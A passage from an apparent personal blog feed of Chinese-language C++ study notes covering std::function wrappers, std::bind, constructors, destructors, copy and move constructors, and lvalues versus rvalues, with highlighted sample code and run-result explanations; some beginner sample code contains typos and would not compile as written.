class="hljs-keyword">private</span>:<br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; tem;<br>  &#125;;<br>  <br>  <br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-comment">//通过函数包装器调用普通函数</span><br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; f1=func;<br>      <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>      <span class="hljs-comment">//伪函数</span><br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; f2=<span class="hljs-built_in">testStruct</span>();<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>      <span class="hljs-comment">//类里面的静态函数</span><br>      f2=name1::classFunc;<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;tsy&quot;</span>);<br>      <span class="hljs-comment">//通过转换运算符，将类变成了可调用对象</span><br>      name1 name;<br>      f2=name;<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;xxp&quot;</span>);<br>  <br>      <span class="hljs-comment">//尝试将function当成参数，调用</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint</span><span class="hljs-params">(f1)</span></span>;<br>      objPrint.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;jc&quot;</span>);<br>      <span class="hljs-comment">//因为我们的类是可调用的对象所以可以当作function</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint2</span><span class="hljs-params">(name)</span></span>;<br>      objPrint2.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;wr&quot;</span>);<br>      <span class="hljs-comment">//调用类的静态</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint3</span><span class="hljs-params">(name.classFunc)</span></span>;<br>      objPrint3.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;01&quot;</span>);<br>      <span class="hljs-comment">//普通函数调用</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint4</span><span class="hljs-params">(func)</span></span>;<br>      objPrint4.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;gzx&quot;</span>);<br>      <span class="hljs-comment">//使用伪函数时需要创建对象</span><br>      testStruct testStruct;<br>      <span class="hljs-function">print <span class="hljs-title">objPrint5</span><span class="hljs-params">(testStruct)</span></span>;<br>      objPrint5.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">9</span>,<span class="hljs-string">&quot;tcx&quot;</span>);<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>## 可调用对象绑定器<br><br>- 作用：<br>  - 将可调用对象绑定成仿函数<br>  - 将多元参数函数绑定成参数为<span class="hljs-number">1</span>，或者（n<span class="hljs-number">-1</span>）的可调用对象<br><br>- 绑定非类的实例：<br><br>  ```c++<br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br>  <br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot; a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; s = &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>      <span class="hljs-keyword">auto</span> f1 = std::<span class="hljs-built_in">bind</span>(print,std::placeholders::_1,std::placeholders::_2);<br>      <span class="hljs-built_in">f1</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>      <span class="hljs-comment">//注意如果在bind的时候初始化了a和s则在f2(),的括号中添加的参数，没有效果</span><br>      <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>(print,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>      <span class="hljs-built_in">f2</span>();<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;xxp&quot;</span>);<span class="hljs-comment">//无效果</span><br>      <span class="hljs-keyword">auto</span> f3= std::<span class="hljs-built_in">bind</span>(print,std::placeholders::_1,<span class="hljs-string">&quot;xxp&quot;</span>);<br>      <span class="hljs-built_in">f3</span>(<span class="hljs-number">3</span>);<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>绑定类里的成员函数和成员变量的实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myClass</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;this is classFunc&quot;</span>&lt;&lt;std::endl;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>    &#125;<br>    std::string s;<br>&#125;;<br><br><span class="hljs-keyword">class</span>  <span class="hljs-title class_">print</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-type">const</span> std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">int</span>,std::string)&gt;&amp; function1):<span class="hljs-built_in">tem</span>(function1)&#123;&#125;;<br>    <span class="hljs-comment">//调用function</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Printf</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>        <span class="hljs-built_in">tem</span>(a,s);<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; tem;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//类的成员函数的绑定</span><br>    myClass myclassObj1;<br>    <span class="hljs-keyword">auto</span> f1= std::<span class="hljs-built_in">bind</span>(&amp;myClass::test,&amp;myclassObj1,std::placeholders::_1,std::placeholders::_2);<br>    <span class="hljs-function">print <span class="hljs-title">frintObj1</span><span class="hljs-params">(f1)</span></span>;<br>    frintObj1.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>    <span class="hljs-comment">//绑定类的成员变量</span><br>    <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>(&amp;myClass::s,&amp;myclassObj1);<br>    <span class="hljs-built_in">f2</span>()=<span class="hljs-string">&quot;chg&quot;</span>;<span class="hljs-comment">//对类成员赋值</span><br>    std::cout&lt;&lt;<span class="hljs-built_in">f2</span>()&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数</title>
    <link href="/2023/03/26/c++/%E5%87%BD%E6%95%B0/"/>
    <url>/2023/03/26/c++/%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><ol><li><p>通过类里函数可以给私有成员赋值，同时也可以通过函数return 出值</p></li><li><p>特殊的成员函数，主要用于创建对象时初始化对象-&gt;给对象成员赋予初值</p></li><li><p>构造函数的特点</p><ul><li>构造函数的函数名与类名相同</li><li>构造函数没有返回值类型，也没有返回值</li><li>构造函数可以重载</li></ul></li><li><p>没有写构造函数，自己会生成，由于内联函数，牺牲时间换效率</p><ul><li><p>系统给的构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Myclass</span>()&#123;&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>系统给的构造函数相当于低保</p></li><li><p>构造函数，在创建时系统就会调用，不能通过对象调用构造函数</p></li><li><p>默认给的构造函数，是<code>public</code>类型</p></li><li><p><code>const</code>:改变性质，将变量变成常量</p><ul><li><p>对<code>const</code>修饰的变量在函数创建时进行赋值：</p></li><li><p>是在初始化的时候赋初值，不是在声明的时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostram&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">chg</span><br>&#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num2;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num3;<br>    <span class="hljs-built_in">chg</span>();<br>  <span class="hljs-keyword">private</span>:  <br>&#125;;<br><br>chg::<span class="hljs-built_in">chg</span>(<span class="hljs-type">int</span> n,<span class="hljs-type">int</span> i):<span class="hljs-built_in">num1</span>(n),<span class="hljs-built_in">num2</span>(i),<span class="hljs-built_in">num3</span>(<span class="hljs-number">3</span>)<span class="hljs-comment">//括号里面可以是变量也可以是常量</span><br>&#123;<br>    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><ol><li>一种特殊的函数，作用是在对象的生命周期结束时进行清理，系统可以自动调用析构函数</li><li>函数名与类名一致，在前面加上<code>~</code></li><li>没有返回值，也没有参数，但必须有参数表也就是（）</li><li>有低保，没写的话，系统自动分配</li><li>可以通过外部访问到析构函数</li><li>在类创建时，自动使用一次，构造，和析构（在生命周期结束时，会自动调用析构函数）</li><li>先构造的后析构</li></ol><h2 id="拷贝构造，-函数"><a href="#拷贝构造，-函数" class="headerlink" title="拷贝构造， 函数"></a>拷贝构造， 函数</h2><ol><li><p>先是构造函数，才可能是拷贝构造函数</p></li><li><p>有低保，系统会统一给</p></li><li><p>第一个参数是，该类的对象</p><p>操作实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Myclass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Myclass</span>();<span class="hljs-comment">//构造函数</span><br>    ~<span class="hljs-built_in">Myclass</span>();<span class="hljs-comment">//析构函数</span><br>    <span class="hljs-built_in">Myclass</span>(Myclass&amp; obj);<span class="hljs-comment">//拷贝构造函数</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用时机</p><ul><li><p>使用一个对象给另一个对象进行初始化</p></li><li><p>使用一个对象构造另一个对象</p></li><li><p>函数的参数是类的对象</p></li><li><p>返回值是类</p><p>实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">zjy</span><br>&#123;<br>    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">zjy2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    zjy zjy3;<span class="hljs-comment">//进行无参构造</span><br>    <br>    <span class="hljs-keyword">return</span> zjy3;<span class="hljs-comment">//由于zjy3存在于栈区，所以函数结束会被回收，因此返回值是zjy3的复制体，此时调用了拷贝构造</span><br>&#125;<br><br><br><br></code></pre></td></tr></table></figure> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">zjy</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> chg;<br>     <span class="hljs-built_in">zjy</span>(<span class="hljs-type">int</span> n);<br>     <span class="hljs-built_in">zjy</span>();<br>     ~<span class="hljs-built_in">zjy</span>();<br>     <span class="hljs-built_in">zjy</span>(zjy&amp;obj);<br>&#125;;<br> zjy::<span class="hljs-built_in">zjy</span>()<br>&#123;<br>     cout&lt;&lt;<span class="hljs-string">&quot;无参构造&quot;</span>&lt;&lt;endl;<br>&#125;<br> zjy::<span class="hljs-built_in">zjy</span>(zjy &amp;obj)<br>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;拷贝构造函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br> zjy::~<span class="hljs-built_in">zjy</span>()<br>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;析构函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br><br> zjy::<span class="hljs-built_in">zjy</span>(<span class="hljs-type">int</span> n)<br>&#123;<br>     chg=<span class="hljs-number">520</span>;<br>     n=chg;<br>     cout&lt;&lt;n&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;带参构造函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     zjy obj;<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">func</span>();<br>    <span class="hljs-function">zjy <span class="hljs-title">obj</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;<br>    zjy chg=<span class="hljs-built_in">func</span>();<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第二个代码运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201151814859.png" alt="image-20221201151814859"></p><ul><li>无参构造：<code>func</code>里面的<code>obj</code></li><li>析构函数：函数调用完会释放内存，这里释放的是第一个obj，所以调用析构函数</li><li>带参构造：43行代码</li><li>无参构造：是因为用了chg来接收</li></ul><p>由于上面结果不一致，重点参考下面的</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201152314605.png" alt="image-20221201152314605"></p><ul><li>无参构造：调用<code>test_func_2()</code>，从主调函数，进入被调函数，创建<code>Monster obj</code>采用的是无参构造</li><li>拷贝构造1号：因为需要函数返回<code>obj</code>,但是函数里面的数据在函数完成时，会被释放，所以采用拷贝构造创建的副本<code>obj</code></li><li>析构（1）：当函数完成时，释放内存，调用析构函数释放原本的<code>obj</code></li><li>析构（2）：由于没有接收<code>obj</code>,所以会在执行完76行释放返回的<code>obj</code>副本</li><li>无参构造：78行调用函数（如上的无参构造）</li><li>拷贝构造1号：如上</li><li>析构（3）：如上，第一个析构</li><li>析构（4）：这里的析构和第二个析构不一样，这里的析构是因为，<code>main</code>完成了，释放<code>monster</code>接收的<code>obj</code></li></ul></li><li><p>问题1：为什么第78行<code>Monster monster=test_func_2()</code>这里没有拷贝构造？</p><ul><li>没有东西去接收复制体时，系统会创建一个临时的对象，再用拷贝构造，将返回的<code>obj</code>，拷贝构造给临时变量</li><li>由于78行，有一个<code>monster</code>接收返回的<code>obj</code>，系统优化，直接复制给<code>monster</code>,所以不会调用拷贝构造</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">zjy</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">func</span>();<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201154807685.png" alt="image-20221201154807685"></p><ul><li>无参构造：因为这里在<code>return </code>后面创建了一个<code>zjy（匿名对象）</code>，相当于在函数外边创建了一个对象，这里不会采用拷贝构造，所以时无参构造</li><li>析构函数：因为没有接收对象，所以在49行的时候析构掉了</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">zjy</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//func();</span><br>    zjy chg=<span class="hljs-built_in">func</span>();<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201155016536.png" alt="image-20221201155016536"></p><ul><li>无参构造：因为调用<code>test_func_2()</code>，创建了一个匿名对象，采用无参构造（和上面的无参构造一样）</li><li>析构：因为main函数结束，调用析构函数</li></ul></li></ul></li><li><p>对于指针的构造：不能直接将指针指向那个地址，而是，创建一个新的内存用于存放原有的数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">int</span> *q=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        p[i]=i;<span class="hljs-comment">//可以相当于创建了一个数组，对于数组的存储可以用arr[i]=int类型</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        q[i]=p[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot;\t&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>浅拷贝和深拷贝</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221202094645975.png" alt="image-20221202094645975"></p></li><li><p>如何防止默认拷贝的发生（浅拷贝）？</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221202095003679.png" alt="image-20221202095003679"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>右值和左值</title>
    <link href="/2023/03/26/c++/%E5%8F%B3%E5%80%BC%E5%92%8C%E5%B7%A6%E5%80%BC/"/>
    <url>/2023/03/26/c++/%E5%8F%B3%E5%80%BC%E5%92%8C%E5%B7%A6%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="右值和左值"><a href="#右值和左值" class="headerlink" title="右值和左值"></a>右值和左值</h1><h2 id="右值左值的区分"><a href="#右值左值的区分" class="headerlink" title="右值左值的区分"></a>右值左值的区分</h2><ol><li><p>能取地址的是左值，不能取地址的是右值</p></li><li><p>实例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//左值</span><br>    <span class="hljs-type">int</span> lvalue=<span class="hljs-number">244</span>;<br>    <span class="hljs-comment">//左值引用</span><br>    <span class="hljs-type">int</span> &amp;lvalueCite=lvalue;<br>    <span class="hljs-comment">//右值</span><br>    <span class="hljs-comment">//右值引用</span><br>    <span class="hljs-type">int</span> &amp;&amp;rvalueCite=<span class="hljs-number">6</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用右值引用延长生命周期</p></li></ol><h2 id="移动构造函数"><a href="#移动构造函数" class="headerlink" title="移动构造函数"></a>移动构造函数</h2><ol><li><p>作用： 复用其他对象的资源（堆内存）</p></li><li><p>实现浅拷贝 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-built_in">name1</span>()&#123;<br>        mPtr=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>;<br>    &#125;<br>    <span class="hljs-comment">//拷贝构造</span><br>    <span class="hljs-built_in">name1</span>(<span class="hljs-type">const</span> name1 &amp;tem)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;mPtr=tem.mPtr;<br>    &#125;<br>    <span class="hljs-comment">//移动构造</span><br>    <span class="hljs-built_in">name1</span>(name1&amp;&amp; tem):<span class="hljs-built_in">mPtr</span>(tem.mPtr)<br>    &#123;<br>        tem.mPtr=<span class="hljs-literal">nullptr</span>;<br><br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> * mPtr;<br>&#125;;<br><br><span class="hljs-function">name1 <span class="hljs-title">getObj</span><span class="hljs-params">()</span></span>&#123;<br>    name1 name11;<br>    *name11.mPtr=<span class="hljs-number">2</span>;<br>    std::cout&lt;&lt;name11.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> name11;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//要求右侧是个临时对象，才会调用移动拷贝构造函数</span><br>    <span class="hljs-comment">//如果没有移动拷贝构造函数，就会调用拷贝构造函数</span><br>    name1 